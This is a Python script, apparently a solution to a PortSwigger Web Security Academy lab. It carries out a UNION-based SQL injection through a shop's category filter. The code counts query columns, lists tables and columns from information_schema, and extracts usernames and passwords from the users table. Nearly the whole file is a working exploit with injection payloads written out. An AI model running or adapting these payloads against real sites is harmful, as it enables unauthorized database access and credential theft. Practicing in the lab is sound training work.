import requests
from bs4 import BeautifulSoup
import re


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    if resp.status_code != 200:
        print(f'Error code {resp.status_code} with text: {resp.text}\n')
        return resp
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(f"List of all th headers:\n{soup.find_all('th')}\n")
    return resp

if __name__ == "__main__":
    site = "ac8c1f751e6a55598038aec200c60090.web-security-academy.net"
    category = "Gifts"
    s = requests.Session()
    url = f'https://{site}'

    columns = 0
    for i in range(0, 10):
        pstring = f"{category}' UNION SELECT null"
        nstring = i * ",null"
        qstring = f'{pstring}{nstring} --'
        resp = try_category(qstring)
        if resp.status_code == 200:
            columns = i + 1
            print(f'Number of columns: {columns}')
            break
    
    resp_one = try_category(f"{category}'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- ")
    print(f"The list of table names are:\n{resp_one.text}")
    print("The users table(s) are:")
    soup = BeautifulSoup(resp_one.text,'html.parser')
    user_table = soup.find('table').find('th', text=re.compile('^users')).text
    print(user_table)


    resp_two = try_category(f"{category}'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_eubdzn'-- ")
    print(f"{resp_two.status_code}{resp_two.text}")
    soup = BeautifulSoup(resp_two.text,'html.parser')
    username_column = soup.find('table').find('th', text=re.compile('^username')).text
    password_column = soup.find('table').find('th', text=re.compile('^password')).text
    print("Usernames\t\t\tPasswords:")
    print(f"{username_column}{password_column}")

    resp = try_category(f"{category}' UNION SELECT {username_column},{password_column} FROM {user_table} -- ")
    soup = BeautifulSoup(resp.text,'html.parser')
    user_table = soup.find('table').find_all('tr')
    print(user_table)
